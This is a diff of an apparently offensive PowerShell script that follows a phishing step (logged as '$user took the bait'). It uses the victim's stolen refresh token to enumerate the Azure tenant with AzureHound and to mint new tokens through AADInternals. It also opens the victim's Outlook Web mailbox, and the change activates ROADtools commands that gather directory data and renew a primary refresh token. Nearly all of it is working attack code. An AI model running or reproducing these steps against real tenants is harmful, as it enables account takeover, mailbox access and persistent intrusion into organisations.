@@ -27,10 +27,7 @@ param (
 # https://github.com/BloodHoundAD/AzureHound/releases/download/v2.0.4/azurehound-windows-amd64.zip
 # https://github.com/BloodHoundAD/AzureHound/releases/download/v2.0.4/azurehound-linux-amd64.zip
 
-# ROADtools
-# pip install roadlib/
-# pip install roadrecon/
-# pip install roadtx/
+
 
 
 # if(!($domain)){ Write-Output "Please specify target domain"; $domain = Read-Host; Write-Output "$domain selected" }
@@ -56,11 +53,7 @@ Write-Output "$user took the bait."
 $tok = $response.refresh_token
 .\azurehound\azurehound.exe -r $tok list --tenant $domain -o .\azurehound.json 
 
-# # RoadRecon
-# RefreshTo-MSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
-# roadrecon auth --access-token $response.access_token
-# roadrecon $gather
-# roadrecon plugin policies 
+
 
 # AAdInternals recon
 $core=RefreshTo-AzureCoreManagementToken -domain $domain
@@ -181,6 +174,22 @@ RefreshTo-SubstrateToken -refreshToken $response.refresh_token -domain $domain -
 Open-OWAMailboxInBrowser -AccessToken $SubstrateToken.access_token -Device Mac -Browser Edge
 
 }
+
+# Road Tools
+# ROADtools
+pip install roadlib
+pip install roadrecon
+pip install roadtx
+
+# # RoadRecon
+RefreshTo-MSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
+roadrecon auth --access-token $response.access_token
+roadrecon gather
+roadrecon plugin policies 
+roadtx prt -a renew
+
+
+
 
 # One Drive PoC
 # Create a new OneDriveSettings object
